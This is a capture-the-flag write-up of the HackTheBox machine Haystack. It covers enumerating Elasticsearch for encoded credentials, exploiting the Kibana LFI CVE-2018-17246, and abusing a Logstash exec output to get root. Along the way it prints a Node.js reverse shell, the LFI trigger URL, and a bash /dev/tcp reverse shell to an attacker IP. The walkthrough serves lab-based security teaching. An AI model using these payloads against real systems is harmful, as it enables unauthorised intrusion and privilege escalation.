---
title: HTB: Haystack
url: https://0xdf.gitlab.io/2019/11/02/htb-haystack.html
date: 2019-11-02T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, ctf, htb-haystack, gobuster, steganography, elasticsearch, ssh, kibana, cve-2018-17246, javascript, lfi, logstash, herokuapp
---

![Haystack](https://0xdfimages.gitlab.io/img/haystack-cover.png)

Haystack wasn’t a realistic pentesting box, but it did provide insight into tools that are common on the blue side of things with Elastic Stack. I’ll find a hint in an image on a webpage, an use that to find credentials in an elastic search instance. Those creds allow SSH access to Haystack, and access to a local Kibana instance. I’ll use a CVE against Kibana to get execution as kibana. From there, I have access to the LogStash config, which is misconfigured to allow a execution via a properly configured log as root.

## Box Info

| Name | [Haystack](https://hackthebox.com/machines/haystack)  [Haystack](https://hackthebox.com/machines/haystack) [Play on HackTheBox](https://hackthebox.com/machines/haystack) |
| --- | --- |
| Release Date | [29 Jun 2019](https://twitter.com/hackthebox_eu/status/1144327235706507264) |
| Retire Date | 02 Nov 2019 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Haystack |
| Radar Graph | Radar chart for Haystack |
| First Blood User | 00:20:30[mpzz mpzz](https://app.hackthebox.com/users/5057) |
| First Blood Root | 01:04:37[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [JoyDragon JoyDragon](https://app.hackthebox.com/users/32897) |

## Recon

### nmap

`nmap` shows two webservers (TCP 80 and 9200), as well as SSH (TCP 22):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.115
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 09:07 EDT
Nmap scan report for 10.10.10.115
Host is up (0.038s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9200/tcp open  wap-wsp

Nmap done: 1 IP address (1 host up) scanned in 20.01 seconds
root@kali# nmap -sC -sV -p 22,80,9200 -oA scans/nmap-scripts 10.10.10.115
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 09:14 EDT
Nmap scan report for 10.10.10.115
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.23 seconds

```

### Website - TCP 80

#### Site

The site is just an image:

```

<html>
<body>
<img src="needle.jpg" />
</body>
</html>

```

![](https://0xdfimages.gitlab.io/img/needle.jpg)

#### Web Directory Brute Force

`gobuster` didn’t find anything:

```

root@kali# gobuster dir -u http://10.10.10.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50                                                                     
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.115
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/06/30 09:17:14 Starting gobuster
===============================================================
===============================================================
2019/06/30 09:18:34 Finished
===============================================================

```

#### Image

Looking at the image from the main page, I ran `strings` on it (with `-n 20` to get longer strings), and a base64 encoded string jumped out:

```

root@kali# strings -n 20 needle.jpg
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==

```

That decodes to:

```

root@kali# strings -n 20 needle.jpg | tail -1 | base64 -d
la aguja en el pajar es "clave"

```

![1561900812830](https://0xdfimages.gitlab.io/img/1561900812830.png)

### ElasticSearch - TCP 9200

#### API

Visiting port 9200 in a web browser shows an ElasticSearch API endpoint:

![1561901470938](https://0xdfimages.gitlab.io/img/1561901470938.png)

#### ES Enumeration

I can list the indexes (think database tables) with the following request:

```

root@kali# curl http://10.10.10.115:9200/_cat/indices?v
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   api     K1OH6o0_Q0OUe5n3vTcGog   5   1          1            0      3.6kb          3.6kb

```

#### Find clave

I got the hint above to search for “clave”. I found it with the command to dump all the entries. I started with the `_search?size=1000` to get what I hoped would be all the documents:

```

root@kali# curl -s -X GET "http://10.10.10.115:9200/bank/_search?size=1000" -H 'Content-Type: application/json' -d'
{
    "query": {
        "match_all": {}
    }
}
' | jq . | head -20
{
  "took": 28,
  "timed_out": false,
  "_shards": {
    "total": 5,
    "successful": 5,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": 1000,
    "max_score": 1,
    "hits": [
      {
        "_index": "bank",
        "_type": "account",
        "_id": "25",
        "_score": 1,
        "_source": {
          "account_number": 25,

```

I see an array of hits that I’m guessing might be the data. I’ll use `jq` to select that array, and output each item on it’s own line:

```

root@kali# curl -s -X GET "http://10.10.10.115:9200/bank/_search?size=1000" -H 'Content-Type: application/json' -d'
{
    "query": {
        "match_all": {}
    }
}
' | jq -c '.hits.hits[]' | head -5
{"_index":"bank","_type":"account","_id":"25","_score":1,"_source":{"account_number":25,"balance":40540,"firstname":"Virginia","lastname":"Ayala","age":39,"gender":"F","address":"171 Putnam Avenue","employer":"Filodyne","email":"virginiaayala@filodyne.com","city":"Nicholson","state":"PA"}}
{"_index":"bank","_type":"account","_id":"44","_score":1,"_source":{"account_number":44,"balance":34487,"firstname":"Aurelia","lastname":"Harding","age":37,"gender":"M","address":"502 Baycliff Terrace","employer":"Orbalix","email":"aureliaharding@orbalix.com","city":"Yardville","state":"DE"}}
{"_index":"bank","_type":"account","_id":"99","_score":1,"_source":{"account_number":99,"balance":47159,"firstname":"Ratliff","lastname":"Heath","age":39,"gender":"F","address":"806 Rockwell Place","employer":"Zappix","email":"ratliffheath@zappix.com","city":"Shaft","state":"ND"}}
{"_index":"bank","_type":"account","_id":"119","_score":1,"_source":{"account_number":119,"balance":49222,"firstname":"Laverne","lastname":"Johnson","age":28,"gender":"F","address":"302 Howard Place","employer":"Senmei","email":"lavernejohnson@senmei.com","city":"Herlong","state":"DC"}}
{"_index":"bank","_type":"account","_id":"126","_score":1,"_source":{"account_number":126,"balance":3607,"firstname":"Effie","lastname":"Gates","age":39,"gender":"F","address":"620 National Drive","employer":"Digitalus","email":"effiegates@digitalus.com","city":"Blodgett","state":"MD"}}

```

Now I can `grep` for “clave”. I don’t find anything in `bank`. But I get two hits in `quotes`:

```

root@kali# curl -s -X GET "http://10.10.10.115:9200/quotes/_search?size=1000" -H 'Content-Type: application/json' -d'
{
    "query": {
        "match_all": {}
    }
}
' | jq -c '.hits.hits[]' | grep clave
{"_index":"quotes","_type":"quote","_id":"111","_score":1,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}
{"_index":"quotes","_type":"quote","_id":"45","_score":1,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}}

```

Those translate to:

![1561903121297](https://0xdfimages.gitlab.io/img/1561903121297.png)

Decoding each base64 gives me a username and password:

```

root@kali# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d 
pass: spanish.is.key
root@kali# echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security 

```

## Shell As security

The username and password above work for SSH:

```

root@kali# ssh security@10.10.10.115
security@10.10.10.115's password:
Last login: Sun Jun 30 09:17:48 2019 from 10.10.14.51
[security@haystack ~]$

```

That’s enough to grab `user.txt`:

```

[security@haystack ~]$ cat user.txt
04d18bc7...

```

## Priv: security –> kibana

### Enumeration

There isn’t much going on as security user, other than `user.txt`. I do notice another service listening only on localhost. Since `netstat` isn’t installed on the box, I’ll have to use `/proc/net/tcp`, and grep for state `0A`, which is listening:

```

[security@haystack home]$ cat /proc/net/tcp | grep '00000000:0000 0A'
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 38071 1 ffff93b16e2407c0 100 0 0 10 0                     
   1: 00000000:23F0 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 38070 1 ffff93b16e240f80 100 0 0 10 0                     
   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37910 1 ffff93b16e240000 100 0 0 10 0                     
   3: 0100007F:15E1 00000000:0000 0A 00000000:00000000 00:00000000 00000000   994        0 260693 1 ffff93b16e2464c0 100 0 0 10 0  

```

The second column is the IP/port it’s listening on in hex. That translates to:

```
0.0.0.0:80
0.0.0.0:9200
0.0.0.0:22
127.0.0.1:5601

```

I’ll use SSH port forwarding to give myself access to this port from my Kali box. I’ll hit Enter a couple times, then `~C` to get to `ssh>`.

```

[security@haystack ~]$ 
ssh> -L 5601:localhost:5601
Forwarding port.

[security@haystack ~]$

```

Now I can go into Firefox and visit `http://127.0.0.1:5601`, and it is a Kibana instance:

![1572210867392](https://0xdfimages.gitlab.io/img/1572210867392.png)

Kibana is a data visualization and query tool, popular with information security operations.

### CVE-2018-17246

#### Background

There’s a public vulnerability in Kibana, [CVE-2018-17246](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/) (that links is a good writeup). There’s also a POC on twitter:

> A little bit sensationalist, as the flaw executes the destination of the LFI as JS, it doesn't dump /etc/passwd to the browser as the above might lead you to think, instead it dumps it to the kibana log. At least this is what i have seen in testing
>
> — Adam (@AdamTheAnalyst) [December 17, 2018](https://twitter.com/AdamTheAnalyst/status/1074726937396948993?ref_src=twsrc%5Etfw)

The vulnerability is a LFI that will run an included Javascript file. [This GitHub](https://github.com/mpgn/CVE-2018-17246) also has good details.

#### Shell

I’ll need to create a reverse shell on Haystack. I’ll use the one from the GitHub link above:

```

[security@haystack shm]$ cat 0xdf.js 
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.8", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

```

Now I can trigger it by visiting `http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/0xdf.js`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.115.
Ncat: Connection from 10.10.10.115:55962.
id
uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0

```

## Priv: kibana –> root

### Enumeration

As kibana, I can access more stuff involved with the Elastic stack. I also noticed that `logstash` is running as root:

```

bash-4.2$ ps awuxx | grep logstash
root       6283 11.3 12.8 2719944 494640 ?      SNsl 10:39   2:11 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash

```

I can also access the `logstash` config files, which I couldn’t before as security because the kibana group can read:

```

bash-4.2$ ls -ld /etc/logstash/conf.d/
drwxrwxr-x. 2 root kibana 62 jun 24 08:12 /etc/logstash/conf.d/
bash-4.2$ ls -l /etc/logstash/conf.d/ 
total 12
-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf

```

### Conf Files

#### input.conf

I’ll start with the `input.conf` file:

```

input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}

```

It’s a file input, which is looking for any file in `/opt/kibana` that starts with `logstash_`. It will look every 10 seconds. It will mark the type as `execute`.

#### filter.conf

The lines read from `input.conf` will be passed through filters as designated in `filter.conf`:

```

filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}

```

So this will look for anything of type `execute` (which things from the previous input will be), and then use this match expression to pull out data. I’ll play with that more in a minute, but it looks like it’s looking for some static strings, and then outputting in a field called `comando`.

#### output.conf

Based on `output.conf`, input of type `execute` will be run using the `exec` plugin. This plugin is typically only used as an input plugin.

```

output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}

```

### Strategy

I’ll use [Herokuapp](http://grokdebug.herokuapp.com/) to test my log against the filter. I’ll start with my filter in the second box:

![1561907471733](https://0xdfimages.gitlab.io/img/1561907471733.png)

Based on the regex, I can see it’s looking for “Ejecutar”, followed by 0 or more space characters, then “comando” followed by 0 or more space characters, the “:”, then one or more space characters. What’s left will be stored as `comando`.

I can test this by adding in an input string, “Ejecutar comando: id”, and I get output:

![1561907681441](https://0xdfimages.gitlab.io/img/1561907681441.png)

Knowing that the output will execute whatever is passed in as `comando`, I will update my input to give a reverse shell:

```

 Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'

```

### Shell

I’ll drop that log into a log file in the right directory:

```

bash-4.2$ echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'"
Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'

bash-4.2$ echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'" > /opt/kibana/logstash_0xdf

```

After a few seconds:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.115.
Ncat: Connection from 10.10.10.115:40238.
bash: no hay control de trabajos en este shell
[root@haystack /]# id
id
uid=0(root) gid=0(root) grupos=0(root) contexto=system_u:system_r:unconfined_service_t:s0

```

And I can get `root.txt`:

```

[root@haystack ~]# cat root.txt 
3f5f727c...

```